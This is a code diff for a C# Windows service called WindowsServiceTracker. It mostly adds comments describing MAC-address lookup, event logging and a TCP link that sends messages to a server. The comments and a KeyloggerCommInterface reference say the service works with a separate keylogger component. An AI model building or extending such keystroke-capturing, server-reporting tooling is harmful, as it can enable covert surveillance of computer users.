@@ -19,8 +19,9 @@ namespace WindowsServiceTracker
 {
     /***********************************************************************
      * This class is where the majority of the work of the service is done.
-     * We may possibly want to split up our different functions into different
-     * classes.
+     * Currently the only functionality not done exclusively in this service
+     * is the keylogging. Keylogging is done in the WTKL project in the
+     * SystemTrayKeylogger.cs file.
      ***********************************************************************/
     public partial class Tracker : ServiceBase, KeyloggerCommInterface
     {
@@ -43,6 +44,9 @@ namespace WindowsServiceTracker
         private volatile bool tcpKeepAlive = true;
         private volatile string macAddress = null;
 
+        /* Constructor for the service. Currently only creates an event log source
+         * that is used to output errors with in the windows event logs.
+         */
         public Tracker()
         {
             InitializeComponent();
@@ -132,12 +136,23 @@ namespace WindowsServiceTracker
             }
         }
 
+        /* This method writes to the windows event logs with an "Information" event
+         * type. All you have to do for it to work is call the method with a string
+         * as the argument and it will write an event for you. Useful for error/bug
+         * output
+         */
         private void WriteEventLogEntry(string eventLogInput)
         {
             //Write to the Windows Event Logs, shows up under Windows Logs --> Application
             EventLog.WriteEntry(ERROR_LOG_SOURCE, eventLogInput, EventLogEntryType.Information);
         }
 
+        /* Gets the MAC address of the laptop. The method loops through all existing network
+         * adapters looking for an ethernet adapter, if one is found then it is immediately
+         * returned. If not, then it looks for a WiFi adapter. If it finds a wifi adapter it
+         * will continue looping to prioritize for ethernet. If neither WiFi nor Ethernet is
+         * found then the last MAC address is used.
+         */
         private string getMacAddress()
         {
             string mac = string.Empty;
@@ -233,6 +248,7 @@ namespace WindowsServiceTracker
             }
         }
 
+        //Creates a new connection with the server.
         private bool Connect()
         {
             try
@@ -245,9 +261,9 @@ namespace WindowsServiceTracker
             {
                 throw new Exception("Error connecting");
             }
-            //return false;
         }
 
+        //Checks to see if there is an open TCP connection and attempts to write to it.
         private bool CheckTCPConnected() // todo fix this shit
         {
             if (tcp == null || tcpStream == null)
@@ -267,6 +283,7 @@ namespace WindowsServiceTracker
             }
         }
 
+        //Closes the TCP connection with the server
         private bool Disconnect()
         {
             try
@@ -278,6 +295,9 @@ namespace WindowsServiceTracker
             return true;
         }
 
+        /* Returns the TCP Stream from the TCP connection object once the TCP connection
+         * has been established.
+         */
         private bool getTcpStream()
         {
             try
@@ -291,6 +311,7 @@ namespace WindowsServiceTracker
             return true;
         }
 
+        //Attempts to write the message passed in as an argument to the TCP Stream
         private bool SendStringMsg(string stringMsg)
         {
             if (tcpStream != null && tcpStream.CanWrite)
